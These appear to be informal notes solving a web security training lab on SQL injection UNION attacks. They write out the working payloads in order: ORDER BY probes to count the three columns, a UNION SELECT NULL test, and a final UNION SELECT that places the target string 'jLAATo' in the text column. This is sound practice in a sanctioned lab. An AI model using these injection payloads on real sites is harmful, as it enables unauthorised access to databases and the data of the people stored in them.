Lab: SQL injection UNION attack, finding a column containing text

Make the database retrieve the string: 'jLAATo'

okay lets see how many columns we have

' order by 1--  okay

' order by 4-- Error
Then 4 - 1 = 3 columns

Determine the type

' UNION SELECT NULL , NULL , NULL-- lets try to see if its oracle
okay is not

we need to put 'jLAATo', lets try one by one

' UNION SELECT NULL , 'jLAATo' , NULL--  Correct